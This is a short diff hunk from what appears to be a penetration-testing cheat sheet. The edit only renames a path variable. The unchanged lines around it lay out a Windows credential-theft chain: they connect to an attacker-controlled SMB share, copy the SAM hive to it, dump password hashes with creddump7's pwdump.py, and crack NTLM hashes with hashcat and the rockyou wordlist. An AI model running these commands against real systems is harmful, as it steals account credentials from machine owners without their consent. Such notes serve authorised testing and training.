@@ -32,5 +32,5 @@ net use \\$LIP /u:ak ak
 copy \Windows\Repair\SAM \\$LIP\ak\
 copy \Windows\Repair\SAM \\$LIP\ak\
 
-python2 $GDIR/tools/Windoes/creddump7/pwdump.py SYSTEM SAM
+python2 $PT_GDIR/tools/Windoes/creddump7/pwdump.py SYSTEM SAM
 hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
